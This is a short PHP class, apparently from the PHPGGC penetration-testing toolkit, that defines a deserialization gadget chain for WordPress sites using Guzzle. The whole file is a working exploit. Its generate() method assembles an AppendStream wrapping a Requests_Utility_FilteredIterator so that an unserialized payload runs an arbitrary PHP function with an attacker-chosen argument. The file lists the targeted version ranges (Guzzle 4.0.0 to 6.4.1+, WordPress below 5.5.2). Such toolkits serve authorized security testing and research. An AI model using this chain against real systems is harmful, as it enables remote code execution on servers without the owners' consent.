<?php

namespace GadgetChain\WordPress\Guzzle;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '4.0.0 <= 6.4.1+ & WP < 5.5.2';
    public static $vector = '__toString';
    public static $author = 'CyanM0un';
    public static $information = 'Tested up to WP 5.2.4 and Guzzle 6.4.1.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \GuzzleHttp\Psr7\AppendStream(
            new \Requests_Utility_FilteredIterator(["key"=>$parameter], $function)
        );
    }
}